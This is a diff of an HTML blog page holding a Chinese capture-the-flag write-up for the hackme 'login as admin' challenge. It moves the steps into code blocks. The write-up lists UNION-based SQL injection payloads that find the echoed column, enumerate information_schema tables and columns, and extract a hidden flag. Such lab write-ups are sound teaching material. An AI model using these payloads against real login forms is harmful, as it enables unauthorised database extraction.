@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/10/12/loginasadmin/loginasadmin1.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/10/12/loginasadmin/loginasadmin2.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/10/12/loginasadmin/loginasadmin3.PNG">
-<meta property="og:updated_time" content="2019-10-12T02:34:35.531Z">
+<meta property="og:updated_time" content="2019-10-12T02:37:41.325Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="loginasadmin">
 <meta name="twitter:description" content="[src = hackme] loginasadmin 系列题目描述login as admin 0： SQL Injection!login as admin 0.1：  Grab the hidden flag">
@@ -389,11 +389,20 @@
 <p>同时提示flag2在数据库中，所以需要通过SQLi来获取数据库里面隐藏的其他flag。其实第一个flag的值已经提示了需要使用UNION查询：</p>
 <p>我们先来测试页面显示的是查询结果的第几列：<br>注入语句为：admin\‘ union select 1,2,3,4#<br>返回页面如下：<br><img src="./loginasadmin2.PNG" alt="login0"><br>2被回显，说明回显的是第2列，我们就利用2的位置显示我们需要的数据，我们演示全部过程：</p>
 <ol>
-<li>查数据库名字：<br>\‘ union select 1,database(),3,4#<br>得到数据库名字为：login_as_admin0</li>
-<li>查询表名：<br>\‘ union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=”login_as_admin0”),3,4#<br>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。</li>
-<li>查询表的列名：<br>\‘ union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=”h1dden_f14g”),3,4#<br>得到就只有1列：<br>the_f14g</li>
-<li>查询该列的具体内容：<br>\‘ union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#<br>得到flag：</li>
+<li>查数据库名字：</li>
 </ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,database(),3,4#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名字为：login_as_admin0<br>2. 查询表名：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="login_as_admin0"),3,4#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。<br>3. 查询表的列名：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME="h1dden_f14g"),3,4#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到就只有1列：<br>the_f14g<br>4. 查询该列的具体内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
 <p><img src="./loginasadmin3.PNG" alt="login0"></p>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>典型的SQLi注入流程，堪称教学式SQLi。</p>
 
